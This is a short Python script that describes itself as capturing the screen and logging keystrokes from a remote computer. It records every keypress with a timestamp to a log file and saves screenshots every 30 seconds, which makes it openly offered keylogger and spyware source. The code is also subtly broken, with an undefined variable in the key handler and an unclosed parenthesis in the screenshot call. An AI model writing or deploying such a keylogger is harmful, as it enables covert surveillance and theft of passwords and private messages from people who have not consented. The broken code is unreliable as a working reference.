#! /usr/bin/env python
"""This script is made to capture the screen and log keystrokes from
a remote computer"""

from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread
import time
import os

class TimeInterval(Timer):
	"""This class was made to handle the intervals of taking the screen
	shots. The run function here waits on the interval while the time
	that it is running on is not finished."""
	def run(self):
		while not self.finished.wait(self.interval):
			#This helps with create a parallel timer
			self.function(*self.args, **self.kwargs)

class Monitoring():
	def _on_press(self, key):
		"""Activates everytime a key is pressed. K is the key press
		object from pynput each time a keypress happens and logs to 
		a file"""
		with open('./keylogs/log.txt', 'a') as f:
			#This gets the key and the timestamp to write to the log file
			f.write('{}\t{}\n'.format(k, time.time()))
	
	def _check_log_folder(self):
		"""Checks to see if the keylogs directory exists. If it does not
		then it will make the directory"""
		if not os.path.exists('./keylogs'):
			os.system('mkdir keylogs')
			os.system('mkdir keylogs/screenshots')
		
	def _keylogging(self):
		""" Hidden helper function that runs the keylogging """
		with Listener(on_press=self._on_press) as listener:
			listener.join()
			
	def _screenshot(self):
		"""This helper function allows for the screenshots to occur"""
		sct = mss() #used to make screenshots
		sct.shot(output='./keylogs/screenshots/{}.png'.format(time.time())
	def run(self, interval=30):
		"""Captures the screenshots and logs key input. Interval is the 
		number of time in seconds between each screenshot."""
		self._check_log_folder() #checks for log folder and builds it
		#if it does not exist
		Thread(target=self._keylogging).start() #start the keylogger
		TimeInterval(interval, self._screenshot).start()

if __name__ == "__main__":
	monitor = Monitoring()
	monitor.run()
